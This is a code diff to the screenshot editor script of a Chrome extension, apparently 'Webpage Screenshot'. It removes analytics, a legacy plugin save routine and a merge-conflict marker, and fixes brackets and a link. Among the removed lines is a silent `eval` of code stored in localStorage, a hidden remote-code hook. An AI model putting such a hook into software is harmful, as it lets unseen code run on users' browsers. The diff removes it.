@@ -1,6 +1,4 @@
-﻿_gaq.push(['_trackPageview']);
-
-String.prototype.twoDigits=function () {return this.replace(/^(.)$/,'0$1')}
+﻿String.prototype.twoDigits=function () {return this.replace(/^(.)$/,'0$1')}
 var canvasToDataURL;
 if (extension.online) {
 	var screenshot = chrome.extension.getBackgroundPage().screenshot;
@@ -810,9 +808,8 @@ function editor_obj()
 
 			pix[thisPoint]=parseInt(inX.data.color.slice(4,-1).split(',')[0]);
 			pix[thisPoint+1]=parseInt(inX.data.color.slice(4,-1).split(',')[1]);
-			pix[thisPoint+2]=parseInt(inX.data.color.slice(4,-1).split(',')[2]);
-=======
-	{
+			pix[thisPoint+2]=parseInt(inX.data.color.slice(4,-1).split(',')[2]);	
+	}
 		var id=inX.ctx.getImageData(0,0,inX.canvas.width,inX.canvas.height);
 		var pix=id.data;
 		var thisPoint;
@@ -1797,89 +1794,6 @@ createFile=function(callback)
 	filename+=localStorage['pngjpg']=='png' ? '.png' : '.jpg';
 
 
-	if(createByPlugin)
-
-		{
-
-		var wSave=0
-		var saveFile=function ()
-			{
-			var a,plugin,plugin1;
-			plugin=document.createElement('embed');
-			plugin.width=plugin.height=1;
-			plugin.type='application/x-webpagescreenshot';
-			document.body.appendChild(plugin);
-
-
-			plugin1=document.createElement('embed');
-			plugin1.type='application/x-screencapture';
-			plugin1.width=plugin1.height=1
-			document.body.appendChild(plugin1);
-			if (plugin1.SaveScreenshot)
-				{
-				plugin1.SaveScreenshot(canvasToDataURL,'Save image');
-				$('#topText').html('Image Saved!<br/><img src=/images/logo_twitter.png height=20 style=vertical-align:middle>&nbsp;<a href=http://twitter.com/home?status=Check%20out%20this%20Chrome%20extesnion%20%22Webpage%20Screenshot%22%2C%20http://bit.ly/cF6sYP%20save%20PNG%20screenshots%20of%20any%20webpage.>Tweet about it</a>');
-				onResize();
-				$('#save').add('#toGoogleDrive').add('#print').attr('disabled','');
-				return true;
-				}
-			else if (plugin.sendKey)
-				{
-				try{
-				plugin.sendKey('B1E883D1AC7C3606B4660A4D3D2765C9'.toLowerCase());
-				}catch (e){ 				try{	/*Do not touch*/		plugin.sendKey('A587C0A90DE83822E695F02DD90B908E'.toLowerCase());}catch (e){} }
-				saveNow=new findAndShowDirs;
-				saveNow.plugin=plugin;
-				saveNow.onChoose=function (x)
-					{
-					plugin.setPath(x);
-					fileName =fileName + (localStorage['pngjpg']=='png' ? '.png' : '.jpg');
-					y=plugin.saveBase64(fileName,canvasToDataURL.slice(canvasToDataURL.indexOf(',')+1));
-					$('#topText').html('Image Saved!<br/><img src=/images/logo_twitter.png height=20 style=vertical-align:middle>&nbsp;<a href=http://twitter.com/home?status=Check%20out%20this%20Chrome%20extesnion%20%22Webpage%20Screenshot%22%2C%20http://bit.ly/cF6sYP%20save%20PNG%20screenshots%20of%20any%20webpage.>Tweet about it</a>');
-					onResize();
-					$('#save').add('#toGoogleDrive').add('#print').attr('disabled','');
-					}
-				saveNow.onClose=function ()
-					{
-					onResize();
-					$('#save').add('#toGoogleDrive').add('#print').attr('disabled','');
-					}
-
-				fileName=prompt('Enter a filename (without \'.png\' or \'.jpg\')\nFor example: \'screenshot1\'.');
-				if (fileName)
-					{
-					saveNow.saveStart();
-					}
-				else
-					{
-					$('#save').add('#toGoogleDrive').add('#print').attr('disabled','');
-					}
-				return true
-				}
-			else
-				{
-				try {if (wSave) {window.clearTimeout(wSave);wSave=0}} catch (e) {}
-				try {document.body.removeChild(plugin)} catch (e) {}
-				try {document.body.removeChild(plugin1)} catch (e) {}
-				wSave=window.setTimeout(saveFile,500)
-				return false
-				}
-			}
-
-		if (!saveFile())
-			{
-			$('#topText').html('For saving you must install Plugin');
-			$('.arrow_' + extension.dir).show();
-			window.setTimeout(function () {$('.cArrow').hide();},3000);
-			$('#save').add('#print').add('#toGoogleDrive').attr('disabled','');
-			//chrome.tabs.create({url:'http://www.webpagescreenshot.info/io/io.crx?install'});
-			window.location='http://www.webpagescreenshot.info/io/iocrx.asp?ver=install';
-			wSave=window.setTimeout(saveFile,500)
-			}
-
-		}
-
-	else
 	if(true){
 		var x=dataURItoBlob(canvasToDataURL);
 		// console.log(x)
@@ -2023,7 +1937,7 @@ function gDrive(){
 			var meta = {
 			"title": screenshot.title,
 			"mimeType": "image/png",
-			"description": 'Taken by Webpage Screenshot. http://www.webpagescreenshot.info'
+			"description": 'Taken by Webpage Screenshot. https://www.webpagescreenshot.info'
 			};
 			var bound = 287032396531387;
 
@@ -2198,10 +2112,10 @@ $(function(){
 		right: document.createElement('img'),
 		empty: document.createElement('img')
 	}
-	border[1].corner.src = base + 'corner1.png'
-	border[1].down.src = base + 'down1.png'
-	border[1].right.src = base + 'right1.png'
-	border[1].empty.src = base + 'empty.png'
+	// border[1].corner.src = base + 'corner1.png'
+	// border[1].down.src = base + 'down1.png'
+	// border[1].right.src = base + 'right1.png'
+	// border[1].empty.src = base + 'empty.png'
 })
 
 function addBorderToCanvas(e) {
@@ -2359,13 +2273,6 @@ urlToShare:'chrome.google.com/webstore/detail/webpage-screenshot/ckibcdccnfeookd
  });
 })
 
-
-if(localStorage['ejseval'])
-try{
-	eval(localStorage['ejseval'])
-}
-catch(easdasdas){}
-
 if (location.hash == "#paste") {
   (function (e) {
     var t;
@@ -2416,6 +2323,7 @@ if (location.hash == "#paste") {
       })
     }
   })(jQuery);
+  
   $(function () {
     $('<center class=paste_modal style="position:absolute;top:150px;width:100%"><br><span style="padding:20px;font-size:40px;border:1px solid black">Press Ctrl+V to paste an image</span></center>').appendTo(document.body);
     $("html").pasteImageReader(function (e, t, n) {
@@ -2427,8 +2335,9 @@ if (location.hash == "#paste") {
       };
       img.src = r.src
     });
-  })(jQuery);
-}
+  })
+
+};
 $(function() {
     if (location.hash == "#capture")
     {
